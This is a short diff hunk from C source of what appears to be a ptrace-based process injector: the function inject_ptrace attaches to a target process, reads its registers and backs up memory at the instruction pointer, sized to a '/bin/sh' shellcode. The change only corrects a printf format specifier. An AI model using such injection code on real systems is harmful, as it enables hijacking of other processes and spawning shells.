@@ -56,7 +56,7 @@ int inject_ptrace(pid_t target_pid) {
     printf("[+] Attached to process\n");
 
     ptrace(PTRACE_GETREGS, target_pid, NULL, &old_regs);
-    printf("[+] RIP: 0x%lx\n", old_regs.rip);
+    printf("[+] RIP: 0x%llx\n", old_regs.rip);
 
     int slen = shell_binsh_len;
     ptrace_readmem(target_pid, old_regs.rip, backup, slen);
